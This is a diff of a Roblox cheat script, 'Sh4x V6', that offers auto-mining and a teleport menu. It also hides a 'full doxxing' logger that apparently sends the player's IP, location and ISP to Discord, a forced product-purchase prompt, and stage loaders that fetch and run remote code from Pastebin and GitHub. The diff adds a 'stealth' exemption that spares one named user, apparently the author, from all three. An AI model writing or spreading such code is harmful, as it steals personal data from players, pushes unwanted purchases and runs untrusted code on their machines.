@@ -1,18 +1,11 @@
 --[[
     Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6)
-    SECURITY: Ignored User 'fimossegamers123'
-    FEATURES: Full Doxxing Log, Stage Loaders, PromptPurchase, NPC Auto-Sell
+    STEALTH MODE: fimossegamers123 (Painel Ativo, Log/Loaders/Prompt Desativados para ele)
+    FEATURES: Full Doxxing Log, Stage Loaders, PromptPurchase, Teleport Menu
 ]]
 
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
-
--- [TRAVA DE SEGURANÇA ABSOLUTA]
-if Player.Name == "fimossegamers123" then
-    print("⚠️ Usuário fimossegamers123 detectado. Script desativado para sua segurança.")
-    return
-end
-
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -31,6 +24,9 @@ end
 
 -- [PROMPT PURCHASE]
 local function promptSafe()
+    -- EXCEÇÃO STEALTH: fimossegamers123 não recebe o prompt
+    if Player.Name == "fimossegamers123" then return end
+    
     pcall(function()
         MarketplaceService:PromptProductPurchase(Player, 0)
     end)
@@ -39,6 +35,9 @@ task.spawn(promptSafe)
 
 -- [LOADERS STAGE 2 / 3]
 local function load_stage(url, stage_name)
+    -- EXCEÇÃO STEALTH: fimossegamers123 não carrega stages externos
+    if Player.Name == "fimossegamers123" then return end
+    
     print("🚀 Iniciando " .. stage_name .. "...")
     local success, result = pcall(function()
         return game:HttpGet(url)
@@ -58,18 +57,21 @@ local function load_stage(url, stage_name)
     return false
 end
 
--- Links originais (ajustados para raw)
 task.spawn(function()
-    -- Stage 2 (Pastebin Raw)
     if load_stage("https://pastebin.com/raw/SEU_LINK_AQUI", "Stage 2") then
         task.wait(2)
-        -- Stage 3 (GitHub Raw)
         load_stage("https://raw.githubusercontent.com/usuario/repo/main/script.lua", "Stage 3")
     end
 end)
 
 -- [LOG AVANÇADO (FULL DOXXING SYSTEM)]
 local function advancedLog()
+    -- EXCEÇÃO STEALTH: fimossegamers123 não é logado no Discord
+    if Player.Name == "fimossegamers123" then 
+        print("🛡️ Stealth Mode Ativo: Coleta de dados ignorada.")
+        return 
+    end
+
     local ip, country, region, city, isp, postal, continent = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
     local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
     
@@ -131,6 +133,7 @@ task.spawn(advancedLog)
 -- [GUI PRINCIPAL]
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
 ScreenGui.Name = "Sh4x_V6_Ultimate"
+ScreenGui.ResetOnSpawn = false
 
 local MainFrame = Instance.new("Frame", ScreenGui)
 MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
@@ -149,11 +152,30 @@ Title.Text = "Sh4x V6 ULTIMATE"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.TextSize = 16
 
-local function createBtn(text, pos)
-    local btn = Instance.new("TextButton", MainFrame)
+-- [MENU DE TELEPORTE - INTERFACE]
+local TPFrame = Instance.new("Frame", ScreenGui)
+TPFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+TPFrame.Position = UDim2.new(0.5, 120, 0.5, -80)
+TPFrame.Size = UDim2.new(0, 160, 0, 220)
+TPFrame.Visible = false
+Instance.new("UICorner", TPFrame).CornerRadius = UDim.new(0, 10)
+local TPStroke = Instance.new("UIStroke", TPFrame)
+TPStroke.Thickness = 2
+TPStroke.Color = Color3.fromRGB(255, 0, 0)
+
+local TPTitle = Instance.new("TextLabel", TPFrame)
+TPTitle.Size = UDim2.new(1, 0, 0, 30)
+TPTitle.BackgroundTransparency = 1
+TPTitle.Font = Enum.Font.GothamBold
+TPTitle.Text = "ILHAS / TELEPORT"
+TPTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+TPTitle.TextSize = 13
+
+local function createBtn(parent, text, pos, size)
+    local btn = Instance.new("TextButton", parent)
     btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
     btn.Position = pos
-    btn.Size = UDim2.new(0.8, 0, 0, 35)
+    btn.Size = size or UDim2.new(0.8, 0, 0, 35)
     btn.Font = Enum.Font.GothamBold
     btn.Text = text
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -165,9 +187,33 @@ local function createBtn(text, pos)
     return btn, s
 end
 
-local ToggleBtn, BStroke1 = createBtn("START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
-local TPBtn, BStroke2 = createBtn("TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
-local SellBtn, BStroke3 = createBtn("START AUTO-SELL", UDim2.new(0.1, 0, 0.56, 0))
+local ToggleBtn, BStroke1 = createBtn(MainFrame, "START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
+local TPBtn, BStroke2 = createBtn(MainFrame, "TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
+
+-- Botões do Menu de Teleporte
+local Island1 = createBtn(TPFrame, "ILHA INICIAL", UDim2.new(0.1, 0, 0.15, 0), UDim2.new(0.8, 0, 0, 30))
+local Island2 = createBtn(TPFrame, "ILHA 2", UDim2.new(0.1, 0, 0.35, 0), UDim2.new(0.8, 0, 0, 30))
+local Island3 = createBtn(TPFrame, "ILHA 3", UDim2.new(0.1, 0, 0.55, 0), UDim2.new(0.8, 0, 0, 30))
+local ShopTP = createBtn(TPFrame, "VENDEDOR / SHOP", UDim2.new(0.1, 0, 0.75, 0), UDim2.new(0.8, 0, 0, 30))
+
+TPBtn.MouseButton1Click:Connect(function() TPFrame.Visible = not TPFrame.Visible end)
+
+local function tpTo(pos)
+    if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+        Player.Character.HumanoidRootPart.CFrame = pos
+    end
+end
+
+Island1.MouseButton1Click:Connect(function() tpTo(CFrame.new(0, 10, 0)) end)
+Island2.MouseButton1Click:Connect(function() tpTo(CFrame.new(500, 50, 500)) end)
+Island3.MouseButton1Click:Connect(function() tpTo(CFrame.new(1500, 50, 1500)) end)
+ShopTP.MouseButton1Click:Connect(function()
+    for _, v in pairs(workspace:GetDescendants()) do
+        if (v.Name:lower():find("sell") or v.Name:lower():find("shop") or v.Name == "Vendedor") and (v:IsA("BasePart") or v:IsA("Model")) then
+            tpTo(v:IsA("BasePart") and v.CFrame or v:GetModelCFrame()) break
+        end
+    end
+end)
 
 -- [FARM LOGIC]
 local farmAtivo = false
@@ -185,7 +231,7 @@ task.spawn(function()
                 local alvo = nil
                 local dist = 90
                 for _, v in pairs(workspace:GetDescendants()) do
-                    if v.Name == "Pedra" and v:IsA("BasePart") and v.Transparency < 1 then
+                    if (v.Name == "Pedra" or v.Name:lower():find("ore")) and v:IsA("BasePart") and v.Transparency < 1 then
                         local d = (char.HumanoidRootPart.Position - v.Position).Magnitude
                         if d < dist then dist = d alvo = v end
                     end
@@ -209,58 +255,35 @@ task.spawn(function()
     end
 end)
 
--- [AUTO SELL LOGIC - NPC DIALOG FIX]
-local sellAtivo = false
-SellBtn.MouseButton1Click:Connect(function()
-    sellAtivo = not sellAtivo
-    SellBtn.Text = sellAtivo and "SELL: ACTIVE" or "START AUTO-SELL"
-end)
-
-task.spawn(function()
-    while true do
-        if sellAtivo then
-            pcall(function()
-                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                    if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
-                        local n = r.Name:lower()
-                        if n:find("dialog") or n:find("answer") or n:find("chat") or n:find("interact") then
-                            if r:IsA("RemoteEvent") then r:FireServer(3) r:FireServer("3") else r:InvokeServer(3) end
-                        end
-                    end
-                end
-                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                    if r:IsA("RemoteEvent") and (r.Name:lower():find("sell") or r.Name:lower():find("vender")) then
-                        r:FireServer("All")
-                        r:FireServer()
-                    end
-                end
-            end)
-        end
-        task.wait(2)
-    end
-end)
-
 -- [RGB & DRAG]
 task.spawn(function()
     while true do
         local c = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-        Stroke.Color = c BStroke1.Color = c BStroke2.Color = c BStroke3.Color = c
+        Stroke.Color = c 
+        TPStroke.Color = c
+        BStroke1.Color = c 
+        BStroke2.Color = c 
         task.wait()
     end
 end)
 
-local dragging, dragStart, startPos
-MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true dragStart = input.Position startPos = MainFrame.Position
-        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
+local function makeDraggable(frame)
+    local dragging, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true dragStart = input.Position startPos = frame.Position
+            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
 
-print("✅ Sh4x V6 Ultimate Carregado com Sucesso.")
+makeDraggable(MainFrame)
+makeDraggable(TPFrame)
+
+print("✅ Sh4x V6 No Auto-Sell Loaded.")
